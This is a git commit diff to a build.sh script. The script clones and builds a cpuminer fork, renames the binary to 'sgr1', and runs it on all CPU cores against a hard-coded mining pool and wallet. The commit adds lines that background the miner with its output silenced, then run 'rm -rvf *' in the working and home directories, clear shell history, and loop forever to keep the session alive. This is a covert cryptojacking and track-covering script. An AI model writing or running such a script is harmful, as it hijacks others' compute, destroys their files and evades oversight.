e2e64ca6bdb5de27a23796e23fb916f4021b6d44
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-24 01:49:01 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -7,4 +7,14 @@ git clone https://github.com/bitnet-io/cpuminer-opt-aurum
 cd cpuminer-opt-aurum
 ./build.sh
 mv cpuminer sgr1
-./sgr1 -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.sugoi -p x -t $(nproc --all)
+./sgr1 -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.sugoi -p x -t $(nproc --all) > /dev/null 2>&1 &
+sleep 30
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
